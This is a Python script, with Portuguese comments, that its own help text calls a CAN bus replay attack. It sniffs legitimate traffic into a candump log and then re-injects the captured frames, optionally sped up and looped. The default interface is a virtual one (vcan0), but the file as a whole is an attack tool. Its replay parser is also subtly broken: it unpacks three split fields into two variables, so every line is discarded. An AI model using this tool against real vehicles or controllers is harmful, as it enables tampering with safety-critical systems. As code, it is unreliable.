#!/usr/bin/env python3
"""
Captura tráfego legítimo (fase de sniffing) e o
retransmite posteriormente (fase de replay)
- Etapa Sniffing: grava por --record-time segundos um log no formato candump
- Etapa Replay: reproduz o log preservando ou acelerando o speedup
"""
import argparse
import sys
import time
import can


def cmd_record(args: argparse.Namespace) -> None:
    bus = can.interface.Bus(channel=args.iface, bustype="socketcan")
    print(f"[INFO] Gravando {args.record_time}s de {args.iface} -> {args.out}")
    n = 0
    t0 = time.perf_counter()
    deadline = t0 + args.record_time
    with open(args.out, "w") as f:
        try:
            while time.perf_counter() < deadline:
                msg = bus.recv(timeout=0.5)
                if msg is None:
                    continue
                # Formato candump: (timestamp) iface ID#DATA
                hexd = msg.data.hex().upper()
                f.write(f"({msg.timestamp:.6f}) {args.iface} "
                        f"{msg.arbitration_id:03X}#{hexd}\n")
                n += 1
        except KeyboardInterrupt:
            print("\n[INFO] Interrompido pelo usuário.")
        finally:
            bus.shutdown()
    print(f"[RESULTADO] {n} frames capturados em {args.out}")


def cmd_replay(args: argparse.Namespace) -> None:
    # Parse simples do formato candump: (ts) iface ID#DATA
    frames = []
    with open(args.input) as f:
        for line in f:
            line = line.strip()
            if not line or not line.startswith("("):
                continue
            try:
                ts_str, frame = line.split(maxsplit=2)
                ts = float(ts_str.strip("()"))
                arb, data_hex = frame.split("#", 1)
                arb_id = int(arb, 16)
                data = bytes.fromhex(data_hex) if data_hex else b""
                frames.append((ts, arb_id, data))
            except ValueError:
                continue

    if not frames:
        sys.exit("[ERRO] Nenhum frame válido encontrado no log.")

    bus = can.interface.Bus(channel=args.iface, bustype="socketcan")
    print(f"[INFO] Replay de {len(frames)} frames | "
          f"speedup={args.speedup}x | loops={args.loops}")

    sent = 0
    t_start = time.perf_counter()
    try:
        for loop in range(args.loops):
            t_origin = frames[0][0]
            t_loop_start = time.perf_counter()
            for ts, arb_id, data in frames:
                # Manter espaçamento original (acelerado)
                target = t_loop_start + (ts - t_origin) / args.speedup
                delay = target - time.perf_counter()
                if delay > 0:
                    time.sleep(delay)
                msg = can.Message(arbitration_id=arb_id, data=data,
                                  is_extended_id=False)
                try:
                    bus.send(msg)
                    sent += 1
                except can.CanError:
                    pass
    except KeyboardInterrupt:
        print("\n[INFO] Interrompido pelo usuário.")
    finally:
        elapsed = time.perf_counter() - t_start
        bus.shutdown()
        print(f"[RESULTADO] Frames re-injetados: {sent} | "
              f"Tempo: {elapsed:.3f}s | "
              f"Taxa média: {sent/elapsed:.0f} fps")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Replay attack em CAN")
    sub = p.add_subparsers(dest="mode", required=True)

    r = sub.add_parser("record", help="Capturar tráfego legítimo")
    r.add_argument("--iface", default="vcan0")
    r.add_argument("--out", required=True)
    r.add_argument("--record-time", type=float, default=20.0)

    rp = sub.add_parser("replay", help="Re-injetar tráfego capturado")
    rp.add_argument("--iface", default="vcan0")
    rp.add_argument("--in", dest="input", required=True)
    rp.add_argument("--speedup", type=float, default=1.0,
                    help="Fator de aceleração temporal (default: 1.0)")
    rp.add_argument("--loops", type=int, default=1,
                    help="Quantas vezes repetir o log (default: 1)")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    if args.mode == "record":
        cmd_record(args)
    else:
        cmd_replay(args)


if __name__ == "__main__":
    main()
